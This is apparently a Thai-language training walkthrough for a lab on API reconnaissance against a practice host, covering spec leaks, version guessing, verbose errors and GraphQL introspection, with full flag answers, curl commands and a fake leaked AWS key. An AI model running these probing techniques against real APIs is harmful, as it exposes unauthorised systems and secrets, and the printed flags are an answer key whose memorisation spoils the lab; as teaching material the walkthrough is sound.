# Module 2 — Lab 3: API Reconnaissance — เดินเกมส์แบบละเอียด (ภาษาไทย)

ไฟล์นี้เป็น **transcript จริงของลำดับขั้นตอน** ไล่เก็บให้ครบทั้ง 4 flags ของ Lab 3 —
ใช้การ์ดที่ 6 **"HTTP(S) Request Tool"** ใน Recon Toolkit เป็นหลัก (ครอบคลุมทั้ง
REST และ GraphQL ในเครื่องมือเดียว)

**Target IP ตอนนี้:** `192.168.174.136` (เช็คกับผู้สอนทุกครั้งที่เปิดเครื่องใหม่)

**ก่อนเริ่ม:** ต้องตั้ง DNS + trust CA ไว้แล้ว (ดูขั้นที่ 0 ใน
[Lab 1 Walkthrough](../Lab1-CloudAssetDiscovery/Walkthrough-TH.md))

**สถานการณ์:** Lab 2 ทิ้ง hint ไว้ว่า "internal API base: /api/internal/" ถึงเวลาเจาะ
`api.soulsecure.lab` จริงจัง — **recon เท่านั้น ห้าม exploit ในโมดูลนี้**

---

## ขั้นที่ 1: หา API spec → เจอ path ที่น่าสงสัย

เปิด `http://192.168.174.136:9091/` ไปที่การ์ดที่ 6 **"HTTP(S) Request Tool"**:

1. **Hostname:** `api.soulsecure.lab`
2. **Method:** GET
3. **Path:** `/openapi.json`
4. กด **Send Request**

ผลลัพธ์ `HTTP 200` พร้อม JSON spec แสดงรายการ path ทั้งหมด อ่านดีๆ จะเจอ path หนึ่ง
ที่ `summary` เขียนว่า:
```
"/api/internal/debug": { "summary": "DEPRECATED - remove before v1.0 GA. Do not document externally." }
```
นี่ไม่ใช่ documentation ปกติ — เป็นโน้ตภายในที่หลุดออกมาในสเปกโดยไม่ตั้งใจ

## ขั้นที่ 2: ไปดู path ที่น่าสงสัย → Flag 1

เปลี่ยนแค่ช่อง **Path** เป็น `/api/internal/debug` (Hostname/Method เดิม) กด
**Send Request**

ผลลัพธ์:
```json
{
  "warning": "internal debug endpoint -- should have been removed before GA",
  "env": {"AWS_ACCESS_KEY_ID": "AKIAFAKESOULSECURE01", "AWS_SECRET_ACCESS_KEY": "..."},
  "flag": "flag{3555384be5128ee4c26ffc4992d2c1e1}"
}
```
(สังเกต AWS key ที่หลุดมาด้วย — เก็บไว้ ใช้ต่อใน Module 4 ทีหลัง ตอนนี้แค่บันทึกไว้พอ)

## ขั้นที่ 3: เช็ค `/api/v1/status` — เจอเหตุผลว่าทำไมต้องลอง v2

ก่อนจะเดา version มั่วๆ กลับไปดู path ที่เหลือใน spec จากขั้นที่ 1 จะเจอ
`/api/v1/status` (ไม่ใช่ endpoint แปลกใหม่ — เป็น path ปกติที่ enumerate เจอตั้งแต่
แรก แค่ยังไม่ได้เปิดดู) ลองด้วย HTTP Request Tool:

1. **Path:** `/api/v1/status`
2. Send Request

```json
{
  "status": "ok",
  "version": "v1",
  "uptime_days": 412,
  "deprecation_notice": "API v1 will be sunset once v2 reaches GA. New integrations should target v2 going forward."
}
```

ตรงนี้แหละคือเหตุผล — ไม่ใช่จู่ๆ นึกอยากลอง `/api/v2/status` ขึ้นมาเฉยๆ แต่เจอ
คำใบ้ตรงๆ จากข้อมูลจริงในระบบว่ากำลังจะมี v2

## ขั้นที่ 4: เดา API version ตามคำใบ้ → Flag 2

ทุก path ใน spec ขึ้นต้นด้วย `/api/v1/` — ลอง v2 ดู:

1. **Path:** `/api/v2/status`
2. Send Request

```json
{"status":"beta","note":"v2 not yet public, do not share this URL","flag":"flag{76616423d4eeb78183ccfbf84092b179}"}
```

## ขั้นที่ 5: ทำให้ endpoint error แล้วอ่าน error message → Flag 3

Spec บอกว่า `/api/v1/orders` รับ parameter `id` เป็นตัวเลข — ลองส่งตัวอักษรแทน:

1. **Path:** `/api/v1/orders?id=abc`
2. Send Request

```json
{
  "error": "Internal Server Error",
  "exception": "ValueError: invalid literal for int() with base 10",
  "traceback": ["File \"/opt/app/api/routes/orders.py\", line 42, ...", "..."],
  "database_url_hint": "postgres://orders_svc:***@orders-db.internal.soulsecure.lab:5432/orders",
  "debug_flag": "flag{7c8934797877b254b9db3695a84cbf8b}"
}
```

## ขั้นที่ 6: GraphQL introspection → หา field ที่ไม่ควรเปิด

API สมัยใหม่ไม่ได้มีแต่ REST — `/openapi.json` ไม่บอกเรื่อง GraphQL เลย ต้องเดา path
เอง (`/graphql`, `/api/graphql`, `/gql`)

1. **Hostname:** `api.soulsecure.lab`
2. **Method:** เปลี่ยนเป็น **POST** (ช่อง Body จะโผล่ขึ้นมาอัตโนมัติ)
3. **Path:** `/graphql`
4. **Headers:** พิมพ์ `Content-Type: application/json`
5. **Body:**
   ```json
   {"query":"{__schema{queryType{fields{name}}}}"}
   ```
6. Send Request

ผลลัพธ์:
```json
{"data":{"__schema":{"queryType":{"fields":[
  {"name":"health"},
  {"name":"orders"},
  {"description":"DEPRECATED - internal use only, do not expose in client apps","name":"internalSecret"}
]}}}}
```
เจอ field `internalSecret` ที่มี description บอกตรงๆ ว่าไม่ควรถูกเปิดให้ query ได้

## ขั้นที่ 7: Query field นั้นตรงๆ → Flag 4 (harder mode)

เปลี่ยนแค่ **Body** เป็น:
```json
{"query":"{internalSecret}"}
```
(Hostname/Method/Path/Headers เดิม) กด Send Request

```json
{"data":{"internalSecret":"flag{b1579ebf26c0e4de304a77b01879d801}"}}
```

---

## สรุป: ครบ 4 Flags ของ Lab 3

| # | จุดที่เจอ | วิธีหา | Flag |
|---|---|---|---|
| 1 | `/api/internal/debug` | เจอจาก spec leak → HTTP Request Tool | `flag{3555384be5128ee4c26ffc4992d2c1e1}` |
| 2 | `/api/v2/status` | เดา version number | `flag{76616423d4eeb78183ccfbf84092b179}` |
| 3 | `/api/v1/orders?id=abc` | ส่ง parameter ผิดชนิด → verbose error | `flag{7c8934797877b254b9db3695a84cbf8b}` |
| 4 ⭐ | `POST /graphql` query `{internalSecret}` | GraphQL introspection แล้ว query field | `flag{b1579ebf26c0e4de304a77b01879d801}` |

**เช็คทั้ง 4 flag รวดเดียวผ่าน command line:**
```bash
echo "--- Flag 1 ---"; curl -sk https://api.soulsecure.lab/api/internal/debug | grep -o 'flag{[^}]*}'
echo "--- Flag 2 ---"; curl -sk https://api.soulsecure.lab/api/v2/status | grep -o 'flag{[^}]*}'
echo "--- Flag 3 ---"; curl -sk 'https://api.soulsecure.lab/api/v1/orders?id=abc' | grep -o 'flag{[^}]*}'
echo "--- Flag 4 ---"; curl -sk https://api.soulsecure.lab/graphql \
  -H 'Content-Type: application/json' -d '{"query":"{internalSecret}"}' | grep -o 'flag{[^}]*}'
```

## หมายเหตุ

- **ระวังเรื่อง `Content-Type: application/json`** ตอนยิง GraphQL — ทั้งใน GUI (ช่อง
  Headers) และ command line (`-H`) ถ้าลืมใส่ API จะเมิน body ที่ส่งไป แล้วตอบ
  `{"health":"ok"}` เฉยๆ แทนที่จะประมวลผล query จริง เป็นจุดพลาดที่พบบ่อยที่สุดของ
  lab นี้
- AWS key ที่หลุดมาใน Flag 1 (`AKIAFAKESOULSECURE01`) เป็นของปลอมสำหรับ lab เท่านั้น
  ไม่ใช่ credential จริง — แต่เป็นจุดเชื่อมไปยัง Module 4 (IAM Exploitation) ทีหลัง
  จดไว้ในรายงานก็พอ ยังไม่ต้องใช้อะไรตอนนี้

## ต่อไป

Lab 4 (Object Storage Enumeration) กลับไปที่ bucket `soulsecure-prod-assets` ที่หลุด
มาตั้งแต่ Lab 1 — เจาะลึกเข้าไปดูเนื้อหาข้างในจริงๆ
